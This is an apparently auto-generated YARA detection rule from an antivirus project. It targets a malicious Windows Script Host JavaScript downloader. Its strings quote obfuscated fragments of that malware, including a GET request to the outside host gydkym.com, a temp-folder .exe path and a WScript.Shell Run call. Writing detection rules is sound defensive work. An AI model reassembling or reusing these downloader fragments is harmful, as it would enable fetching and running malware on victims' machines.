rule sig_20160328_1a81f052b3cb6a6d4bfbb9e434c25157 {
  meta:
    description = "datamaliciousorder - file 20160328_1a81f052b3cb6a6d4bfbb9e434c25157.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b54178d077b17e56f1c8e9791189132b734e77d929b9abedcfa7922d439a7280"

  strings:
    $s1  = "function Vmezpcwved() {return Txenz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"tU0fHpUQnSqnxrk.exe\";};" fullword ascii
    $s2  = "Wjzaw[Yksmlyqsyj](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Gfwesoty](Hfeatnv() * 11)} while (Wjzaw[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Qaopxj(Zixmhls, Vurnbrtcly){return Zixmhls - Vurnbrtcly;};" fullword ascii
    $s5  = "var Txenz = function Yrndwdtice() {return WScript[Kdvhsdj](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Qfwud() {return ((Cnfnmoc == true) && (Cnfnmoc == Iebdapu)) ? 1 : Iipymvuobn;};" fullword ascii
    $s7  = "function Nlzczw(Jxgpnof){Txenz[\"Run\"](Jxgpnof, Iipymvuobn, Iipymvuobn);};" fullword ascii
    $s8  = "var Gfhpwld = new this[\"Date\"]();" fullword ascii
    $s9  = "var Ljafjel = false;" fullword ascii
    $s10 = "var Iebdapu = false;" fullword ascii
    $s11 = "Iebdapu = true; " fullword ascii
    $s12 = "function Pbxhbom(Yujucmg) {var Yjnrwijyhb = (1, 2, 3, 4, 5, Yujucmg); return Yjnrwijyhb;};" fullword ascii
    $s13 = "Cnfnmoc = true; " fullword ascii
    $s14 = "function Xefjcw(){return Eodevdqbp;};" fullword ascii
    $s15 = "return Qaopxj(Enctu, Xbyusa);" fullword ascii
    $s16 = "function Hfeatnv(){return 22;};" fullword ascii
    $s17 = "function Xmsgg(){return Kdvhsdj;};" fullword ascii
    $s18 = " while (Zfvzpmccy){" fullword ascii
    $s19 = "var Cnfnmoc = false;" fullword ascii
    $s20 = "function Pdtivr()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}